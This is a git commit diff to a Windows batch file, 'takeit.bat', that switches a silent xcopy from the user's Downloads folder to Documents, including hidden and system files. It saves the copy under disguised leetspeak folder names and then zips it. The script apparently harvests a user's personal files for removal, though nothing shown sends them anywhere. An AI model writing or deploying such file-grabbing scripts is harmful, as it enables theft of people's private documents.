64ee8c525cf6953b6387665a6998b04dddbef95b
dreadnought24-rgb <sofyanrezky097@gmail.com>
2026-09-11 14:13:36 +0700

    Update takeit.bat

--- mirror/takeit.bat
+++ mirror/takeit.bat
@@ -2,7 +2,7 @@
 set backupcmd=xcopy /s /c /d /e /h /i /r /y
 set dest=C:\wadah\hasil
 
-%backupcmd% "%USERPROFILE%\Downloads" "%dest%\downl04ds"
+%backupcmd% "%USERPROFILE%\Documents" "%dest%\docum3n7"
 
 :: buat zip
 powershell -command "Compress-Archive -Path '%dest%\*' -DestinationPath 'C:\wadah\hasil.zip' -Force"
